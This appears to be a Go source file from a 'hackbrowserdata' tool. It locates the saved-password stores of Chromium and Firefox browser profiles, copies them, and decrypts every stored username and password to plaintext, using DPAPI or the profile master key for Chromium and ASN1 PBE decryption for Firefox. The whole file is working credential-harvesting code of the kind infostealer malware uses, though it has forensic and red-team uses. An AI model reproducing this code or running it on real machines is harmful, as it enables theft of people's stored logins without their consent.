package hackbrowserdata

import (
	"database/sql"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"time"

	// import sqlite3 driver
	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"

	"github.com/moond4rk/hackbrowserdata/crypto"
	"github.com/moond4rk/hackbrowserdata/item"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
	"github.com/moond4rk/hackbrowserdata/utils/typeutil"
)

type Password struct {
	Profile     string
	Username    string
	Password    string
	encryptPass []byte
	encryptUser []byte
	LoginURL    string
	CreateDate  time.Time
}

func (c *chromium) Passwords() ([]Password, error) {
	if _, ok := c.supportedDataMap[TypePassword]; !ok {
		// TODO: Error handle more gracefully
		return nil, errors.New("password for c.name is not supported")
	}
	var fullPass []Password
	for _, profile := range c.profilePaths {
		passFile := filepath.Join(profile, TypePassword.Filename(c.name))
		if !fileutil.IsFileExists(passFile) {
			return nil, errors.New("password file does not exist")
		}
		if err := fileutil.CopyFile(passFile, item.TempChromiumPassword); err != nil {
			return nil, err
		}
		passwords, err := c.exportPasswords(profile, item.TempChromiumPassword)
		if err != nil {
			return nil, err
		}
		if len(passwords) > 0 {
			fullPass = append(fullPass, passwords...)
		}
	}
	return fullPass, nil
}

func (c *chromium) exportPasswords(profile, dbfile string) ([]Password, error) {
	db, err := sql.Open("sqlite3", dbfile)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	rows, err := db.Query(queryChromiumLogin)
	if err != nil {
		return nil, err
	}
	var passwords []Password
	for rows.Next() {
		var (
			url, username         string
			encryptPass, password []byte
			create                int64
		)
		if err := rows.Scan(&url, &username, &encryptPass, &create); err != nil {
			log.Warn(err)
		}
		pass := Password{
			Profile:     filepath.Base(profile),
			Username:    username,
			encryptPass: encryptPass,
			LoginURL:    url,
		}
		if len(encryptPass) > 0 {
			if len(c.masterKey) == 0 {
				password, err = crypto.DPAPI(encryptPass)
			} else {
				password, err = crypto.DecryptPass(c.masterKey, encryptPass)
			}
			if err != nil {
				log.Error(err)
			}
		}
		if create > time.Now().Unix() {
			pass.CreateDate = typeutil.TimeEpoch(create)
		} else {
			pass.CreateDate = typeutil.TimeStamp(create)
		}
		pass.Password = string(password)
		passwords = append(passwords, pass)
	}
	return passwords, nil
}

const (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
)

func (f *firefox) Passwords() ([]Password, error) {
	if _, ok := f.supportedDataMap[TypePassword]; !ok {
		// TODO: Error handle more gracefully
		return nil, errors.New("password for c.name is not supported")
	}
	var fullPass []Password
	for profile, masterKey := range f.profilePathKeys {
		passFile := filepath.Join(profile, TypePassword.Filename(f.name))
		if !fileutil.IsFileExists(passFile) {
			fmt.Println(passFile)
			return nil, errors.New("password file does not exist")
		}
		if err := fileutil.CopyFile(passFile, item.TempFirefoxPassword); err != nil {
			return nil, err
		}
		passwords, err := f.exportPasswords(masterKey, item.TempFirefoxPassword)
		if err != nil {
			return nil, err
		}
		if len(passwords) > 0 {
			fullPass = append(fullPass, passwords...)
		}
	}
	return fullPass, nil
}

func (f *firefox) exportPasswords(masterKey []byte, loginFile string) ([]Password, error) {
	s, err := os.ReadFile(loginFile)
	if err != nil {
		return nil, err
	}
	defer os.Remove(loginFile)
	loginsJSON := gjson.GetBytes(s, "logins")
	var passwords []Password
	if loginsJSON.Exists() {
		for _, v := range loginsJSON.Array() {
			var (
				p           Password
				encryptUser []byte
				encryptPass []byte
			)
			p.LoginURL = v.Get("formSubmitURL").String()
			encryptUser, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			if err != nil {
				return nil, err
			}
			encryptPass, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			if err != nil {
				return nil, err
			}
			p.encryptUser = encryptUser
			p.encryptPass = encryptPass
			// TODO: handle error
			userPBE, err := crypto.NewASN1PBE(p.encryptUser)
			if err != nil {
				return nil, err
			}
			pwdPBE, err := crypto.NewASN1PBE(p.encryptPass)
			if err != nil {
				return nil, err
			}
			username, err := userPBE.Decrypt(masterKey)
			if err != nil {
				return nil, err
			}
			password, err := pwdPBE.Decrypt(masterKey)
			if err != nil {
				return nil, err
			}
			p.Password = string(password)
			p.Username = string(username)
			p.CreateDate = typeutil.TimeStamp(v.Get("timeCreated").Int() / 1000)
			passwords = append(passwords, p)
		}
	}
	return passwords, nil
}
